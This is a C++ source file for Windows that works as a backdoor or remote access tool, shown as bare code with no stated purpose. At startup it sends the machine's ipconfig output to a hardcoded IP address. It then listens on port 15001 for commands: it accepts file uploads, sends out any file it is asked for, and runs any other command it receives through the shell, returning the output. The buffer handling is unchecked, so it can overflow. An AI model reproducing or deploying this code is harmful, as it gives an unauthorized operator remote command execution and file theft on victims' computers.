#include <stdio.h>
#include <iostream>
#include <winsock2.h>
#define PORT 15001
#define ERROR 0
#define IP "192.168.191.1"
#define BUFFER_SIZE 10240
#include <windows.h>
#include <string.h>
using namespace std;
void Send()
{
    SOCKET sock2;
    SOCKADDR_IN ClientAddr;
    WSADATA WSAData;

    if(WSAStartup(MAKEWORD(2,2),&WSAData)==SOCKET_ERROR)
    {
        //printf("Socket initialize fail!\n");
        exit(1);
    }
    if((sock2=socket(AF_INET,SOCK_STREAM,0))==SOCKET_ERROR)
    {
      //printf("Socket create fail!\n");
      closesocket(sock2);
      WSACleanup();
      //system("pause");
      exit(1);
    }
    ClientAddr.sin_family=AF_INET;
    ClientAddr.sin_port=htons(8800);
    ClientAddr.sin_addr.s_addr=inet_addr(IP);
    if(connect(sock2,(LPSOCKADDR)&ClientAddr,sizeof(ClientAddr))==SOCKET_ERROR)
    {
      //printf("Connect fail!\n");
      closesocket(sock2);
      WSACleanup();
      //system("pause");
      exit(1);
    }

    FILE *pf=popen("ipconfig","r");
    char bf[BUFFER_SIZE];
    //char bf2[BUFFER_SIZE];
    int length=BUFFER_SIZE;
    do
    {
        length=fread(bf,sizeof(char),BUFFER_SIZE,pf);
        //cout<<"ÒÑ·¢ËÍ£º"<<length<<endl;
        send(sock2,bf,length,0);
        memset(bf,0,BUFFER_SIZE);
    }while(length>0);
    /*while(fgets(bf,BUFFER_SIZE,pf)!=NULL)
    {
        int i=0;
        while(bf[i]!='\0')
        {
            bf2[j]=bf[i];
            i++;
            j++;
        }
        //printf("%s\n",bf);
    }*/
    //bf2[j]='\0';
    pclose(pf);
    //send(sock2,bf2,BUFFER_SIZE,0);
    closesocket(sock2);
    WSACleanup();
}
SOCKET con()
{
    SOCKET sock;
    WSADATA WSAData;
    SOCKADDR_IN ServerAddr;
    if(WSAStartup(MAKEWORD(2,2),&WSAData)==SOCKET_ERROR)
    {
        exit(1);
    }
    if((sock=socket(AF_INET,SOCK_STREAM,0))==ERROR)
    {
        WSACleanup();
        exit(1);
    }
    ServerAddr.sin_family=AF_INET;
    ServerAddr.sin_port=htons(PORT);
    ServerAddr.sin_addr.s_addr=INADDR_ANY;
    if(bind(sock,(LPSOCKADDR)&ServerAddr,sizeof(ServerAddr))==SOCKET_ERROR)
    {
        closesocket(sock);
        WSACleanup();
        exit(1);
    }
    if(listen(sock,10)==SOCKET_ERROR)
    {
        closesocket(sock);
        WSACleanup();
        exit(1);
    }
    return sock;
}
int main()
{
    SOCKET sock,msgsock;
    Send();
    char buf[BUFFER_SIZE];
    char bf[BUFFER_SIZE];
    sock=con();
    while(1)
    {
        if((msgsock=accept(sock,(LPSOCKADDR)0,(int *)0))==INVALID_SOCKET)
        {
            exit(1);
        }
        memset(buf,0,sizeof(buf));
        recv(msgsock,buf,BUFFER_SIZE,0);
        if(buf[0]=='e' && buf[1]=='x' && buf[2]=='i' && buf[3]=='t')
        {
            closesocket(sock);
            closesocket(msgsock);
            WSACleanup();
            exit(1);
        }
        if(buf[0]=='s' && buf[1]=='e' && buf[2]=='n' && buf[3]=='d')//send E:\\chain.txt
        {
            char a[20]="E:\\";
            int i=0,j=0;
            int length=0;
            while(a[j]!='\0')
            {
                j++;
            }
            while(buf[i]!='\0')
            {
                i++;
            }
            while(buf[i]!='\\')
            {
                i--;
            }
            i++;
            while(buf[i]!='\0')
            {
                a[j]=buf[i];
                i++;
                j++;
            }
            a[j]='\0';
            FILE *f=fopen(a,"wb");

            while(1)
            {
                length=recv(msgsock,buf,BUFFER_SIZE,0);
                if(length==0) break;
                fwrite(buf,sizeof(char),length,f);
                memset(buf,0,BUFFER_SIZE);
                length=0;
            }
            fclose(f);
        }
        if(buf[0]=='r' && buf[1]=='e' && buf[2]=='c' && buf[3]=='v')
        {
            FILE *f=fopen(&buf[5],"rb");
            int length=BUFFER_SIZE;
            memset(buf,0,BUFFER_SIZE);
            while(1)
            {
                length=fread(buf,sizeof(char),BUFFER_SIZE,f);
                if(length==0) break;
                send(msgsock,buf,length,0);
                memset(buf,0,BUFFER_SIZE);
            }
            fclose(f);
        }
        else
        {
            memset(bf,0,sizeof(bf));
            FILE *pf=popen(buf,"r");
            char bf2[BUFFER_SIZE];
            memset(bf2,0,sizeof(bf2));
            int j=0;
            while(fgets(bf,BUFFER_SIZE,pf)!=NULL)
            {
                int i=0;
                while(bf[i]!='\0')
                {
                    bf2[j]=bf[i];
                    i++;
                    j++;
                }

            }
            pclose(pf);
            int Ret;
            Ret=send(msgsock,bf2,BUFFER_SIZE,0);
            if(Ret==SOCKET_ERROR)
            {
                exit(1);
            }
            closesocket(msgsock);
        }

    }
    closesocket(msgsock);
    closesocket(sock);
    WSACleanup();
    return 0;
}
